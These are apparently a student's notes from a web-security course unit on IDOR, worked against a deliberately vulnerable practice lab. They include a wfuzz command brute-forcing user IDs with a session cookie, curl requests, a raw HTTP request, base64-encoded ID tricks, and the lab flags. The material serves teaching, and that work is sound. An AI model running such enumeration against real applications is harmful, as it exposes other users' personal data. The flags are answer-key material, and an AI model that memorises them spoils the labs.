
This Learning Unit covers the following Learning Objectives:

1. Understand how to exploit Static File IDOR
2. Learn more about exploiting ID-Based IDOR
3. Discover how to exploit More Complex IDOR

In this Learning Unit, we will cover the basics of exploitation for IDOR. We will work through the IDOR Sandbox to manually identify which parameters may be vulnerable to our previously-discussed IDOR findings.

We'll start by examining the direct exploitation of static file-based IDOR.

---------
#### 13.2.1. Accessing The IDOR Sandbox Application

We will use the IDOR Sandbox throughout this Learning Module. The IDOR Sandbox is a custom application with intentionally-vulnerable functions for practicing IDOR identification.

We can access it via anÂ /etc/hostsÂ file entry on our Kali Linux VM.

```bash
kali@kali:~$ sudo mousepad /etc/hosts

kali@kali:~$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

192.168.50.100  idor-sandbox
```

Let's start the IDOR Sandbox and update the corresponding IP address on our Kali machine before beginning our work.

When we visit the landing page for our IDOR Sandbox application, we will notice a series of buttons that direct us to their corresponding Learning Module pages.

![[Pasted image 20241105143508.png]]

Let's begin by discussing how to exploit static file IDOR.

#### 13.2.2. Exploiting Static File IDOR

With a deeper understanding of static file IDOR, let's review an example within the IDOR Sandbox. We can start by clickingÂ _FILE-BASED IDOR_.

![[Pasted image 20241105143543.png]]

We will be re-directed to theÂ `/docs/?f=1.txt`Â URI.

![[Pasted image 20241105143635.png]]

Next, let's closely examine the data rendered and displayed on this page.

![[Pasted image 20241105143648.png]]
The output shows exfiltrated information from a text file on the target web server.

Based on what we learned regarding file-based IDOR, let's attempt to manipulate theÂ `/docs/?f=1.txt`Â value and increment it once.

After submitting our new query string, we will receive the following output.

![[Pasted image 20241105143745.png]]

Our suspicions of being able to exfiltrate information by incrementing this text file object referencing worked very well. We supplied theÂ _f_Â parameter with a value of "2.txt" and were presented with different output than before.

This time, we managed to exfiltrate the full name of an individual, where they are from, and whether or not they are a registered organ donor.

In the coming section, we will discuss the exploitation of ID-Based IDOR.

---------
#### 13.2.3. Exploiting ID-Based IDOR

Let's now examine database object referencing orÂ _ID-Based IDOR_.[1](https://portal.offsec.com/courses/web-200-28380/learning/insecure-direct-object-referencing-36181/exploiting-idor-in-the-sandbox-36211/exploiting-static-file-idor-36184#fn-local_id_180-1)Â We'll navigate back to the Sandbox landing page and clickÂ _ID-BASED IDOR_.

![[Pasted image 20241105150630.png]]

This redirects us to theÂ `/customerPage/?custId=1`Â URI.

![[Pasted image 20241105152629.png]]

Let's note that the types of information retrieved from the database before we move forward by incrementingÂ _custId_Â to "2".

![[Pasted image 20241105152650.png]]

We can confirm that this is a case of IDOR (of the customer's ID Object) by taking note of the output rendered in the web browser as a result of our incremented value.

Essentially, we can iterate through the database table directly from an insecure endpoint to retrieve the same type of information belonging to a different customer, in this case with an ID value of "2". We'll note we retrieved the User ID, Handle, Name, Location, and the customer's Member Status. Accessing this type of information by incrementing a database value in the query string indicates the presence of database object referencing IDOR.

***Because we retrieved information through the web browser for a separate user entirely that corresponds with a Customer ID value of "2", we can guess this was the second registered user for the web application.***


In the coming section, we will continue with our exploitation of IDOR by discussing UIDs in more detail.

##### Labs
1. `OS{IDOR_FLAG_TEW}`
payload: `http://idor-sandbox/customerPage/?custId=6`
![[Pasted image 20241105154610.png]]
![[Pasted image 20241105154655.png]]

-----------

#### 13.2.4. Exploiting More Complex IDOR

To begin, we will cover the exploitation of user IDOR from an authenticated perspective.[1](https://portal.offsec.com/courses/web-200-28380/learning/insecure-direct-object-referencing-36181/exploiting-idor-in-the-sandbox-36211/exploiting-more-complex-idor-36182#fn-local_id_352-1)Â Let's log in as the userÂ `Harb`Â using the password valueÂ `RockFaceKingdom`Â at the endpointÂ `http://idor-sandbox:80/user/`.

![[Pasted image 20241105154850.png]]

Once logged in, we will be notified of a successful login attempt. We'll also be re-directed toÂ `/user/?uid=62718`, which shows the output corresponding to the user "Harb".

![[Pasted image 20241105155016.png]]

The output includes the UID, Name, Handle, Geographical Location, and Member Status of our signed-in user (Harb). Next, let's attempt to retrieve information about other users. We can even demonstrate exfiltrating user data with unknown UIDs.

Our current UID consists of five sequential characters, which indicates at least 99,999 possibilities. This adds a semblance of security for the registered member. However, the premise behind this attack is to brute force potential UIDs and iterate programmatically through thousands of possibilities.

In order to brute force the UIDs, we'll iterate through the options 99,999 times using a wordlist from Seclists. We can find the wordlist on our Kali Linux Machine atÂ `/usr/share/seclists/Fuzzing/5-digits-00000-99999.txt`.

If we fuzz all of these requests, we'll receive a lot of responses to review. Let's send a request withÂ _curl_Â so that we can establish a baseline response size. We'll use this response size to filter our wfuzz results.

Below, theÂ -sÂ argument instructsÂ curlÂ to not display a progress bar since we are only interested in the response size. Lastly, we can specify theÂ `-w '%{size_download}'`Â argument-value combination, directing curl to print the response size in the terminal output.

```bash
kali@kali:~$ curl -s http://idor-sandbox:80/user/?uid=62718 -w '%{size_download}'
0
```

Our output came back as 0 bytes. This is because we did not specify a valid session ID when we executed our curl request. In web application assessments, we will often need to do both unauthenticated and authenticated fuzzing to retrieve accurate results. This means we need to include a valid session ID in our wfuzz command.

To retrieve this session ID, we need to enableÂ `Intercept`Â in Burp Suite and capture a request from the login URI ofÂ /user/login.phpÂ authenticated as the user Harb.

![[Pasted image 20241105155712.png]]

Capturing the above request provides us with a cookie value. We can use curl again, this time with the session ID, and attempt to gain an erroneous response size from an authenticated perspective.

***Please note that the session ID will differ and should be closely examined.***

The nextÂ curlÂ command is only slightly different than before. We'll add theÂ `--header`Â argument for an authenticated request, and also include a random UID value of `"91191"` to gather a known erroneous response size.

```bash
kali@kali:~$ curl -s /dev/null http://idor-sandbox:80/user/?uid=91191 -w '%{size_download}' --header "Cookie: PHPSESSID=f41ffa33a0125d011ec500d2fc80afd8"
...
2873
```
![[Pasted image 20241105155902.png]]


The response size for a logged-in session's erroneous output is `2873 bytes`. We will make sure to exclude this value in our upcoming fuzzing attempts.

Let's begin fuzzing. Within Wfuzz, we can use theÂ `-c`Â argument to denote that we would like color output. Next,Â `-z`Â acts as our file input method. We'll specifyÂ file, followed by our wordlist. Next, we will exclude any 404 responses by providing theÂ `--hc 404`Â argument-value combination. To exclude our erroneous bytes (2873), we will provide theÂ `--hh 2873`Â argument-value combination.

Finally, we need provide a header containing a cookie value. This can be done using theÂ `-H`Â argument followed by the cookie value we previously collected. Our fuzzing endpoint isÂ `http://idor-sandbox:80/user/?uid=FUZZ`.

```bash
â”Œâ”€â”€(rootðŸ’€gobots)-[05Nov2024 20:57:58]-[/home/kali]
â””â”€# wfuzz -c -z file,/usr/share/seclists/Fuzzing/5-digits-00000-99999.txt --hc 404 --hh 2873 -H "Cookie: PHPSESSID=f41ffa33a0125d011ec500d2fc80afd8" http://idor-sandbox:80/user/?uid=FUZZ
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://idor-sandbox:80/user/?uid=FUZZ
Total requests: 100000

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                   
=====================================================================

000011112:   200        76 L     176 W      2902 Ch     "11111"                                                                                       
000016328:   200        76 L     176 W      2906 Ch     "16327"                                                                                       
000023102:   200        76 L     176 W      2908 Ch     "23101"                                                                                       
000039202:   200        76 L     176 W      2907 Ch     "39201"                                                                                       
000041913:   200        76 L     176 W      2908 Ch     "41912"                                                                                       
000057192:   200        76 L     176 W      2908 Ch     "57191"                                                                                       
000062719:   200        76 L     176 W      2910 Ch     "62718"                                                                                       
000074833:   200        76 L     176 W      2904 Ch     "74832"                                                                                       
000083272:   200        76 L     177 W      2952 Ch     "83271"                                                                                       
000099181:   200        76 L     177 W      2907 Ch     "99180"                                                                                       
Total time: 0
Processed Requests: 100000
Filtered Requests: 99990
Requests/sec.: 0


```

We have successfully managed to retrieve other users' UID values. We could exfiltrate information about these users by simply providing these values in place of our valid UID.

Let's give it a try. We'll point our browser toÂ `http://idor-sandbox:80/user/?uid=57191`, using a UID collected from our fuzzing.

Loading this endpoint to our web browser, we'll receive the following data.

![[Pasted image 20241105161329.png]]

We have successfully exfiltrated the Name, Handle, Location, and Member Status for the user McLovin.

In the next Learning Unit, we will cover an IDOR Case Study for OpenEMR.


#### 13.2.5 Extra Mile Labs
![[Pasted image 20241105163807.png]]
Took this from the `wfuzz` results
```bash
000083272:   200        76 L     177 W      2952 Ch     "83271"  
```
used this payload to get flag in burpsuite
```http
GET /user/unsubscribe.php?uid=83271 HTTP/1.1
Host: idor-sandbox
Accept-Language: en-US
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://idor-sandbox/user/?uid=99180
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=f41ffa33a0125d011ec500d2fc80afd8
Connection: keep-alive
```


![[Pasted image 20241105163634.png]]


##### Labs

1. `OS{decodeAndEncodeAllTheThings}`
 ![[Pasted image 20241105174700.png]]
This is the webpage
![[Pasted image 20241105173153.png]]
when decoded it is broken out to one
```bash
â”Œâ”€â”€(rootðŸ’€gobots)-[05Nov2024 22:28:12]-[/home/kali]
â””â”€# echo "MQ==" | base64 --decode
1            
```
now to encode utilize this command
```bash
â”Œâ”€â”€(rootðŸ’€gobots)-[05Nov2024 22:33:12]-[/home/kali]
â””â”€# echo -n "1" | base64
MQ==
```
###### 2
```bash
â”Œâ”€â”€(rootðŸ’€gobots)-[05Nov2024 22:34:04]-[/home/kali]
â””â”€# echo -n "2" | base64
Mg==
```
`http://idor-sandbox/challenge/?uid=Mg==`
![[Pasted image 20241105173553.png]]
###### 7
```bash
â”Œâ”€â”€(rootðŸ’€gobots)-[05Nov2024 22:34:56]-[/home/kali]
â””â”€# echo -n "7" | base64
Nw==
```
`http://idor-sandbox/challenge/?uid=Nw==`
![[Pasted image 20241105174550.png]]

2.
`OS{ITTERATE_THOSE_UIDS}`
this was the same utilized in the previous lessons
```bash
wfuzz -c -z file,/usr/share/seclists/Fuzzing/5-digits-00000-99999.txt --hc 404 --hh 2873 -H "Cookie: PHPSESSID=f41ffa33a0125d011ec500d2fc80afd8" http://idor-sandbox:80/user/?uid=FUZZ
```


![[Pasted image 20241105175044.png]]
payload used
```bash
http://idor-sandbox/user/?uid=83271
```
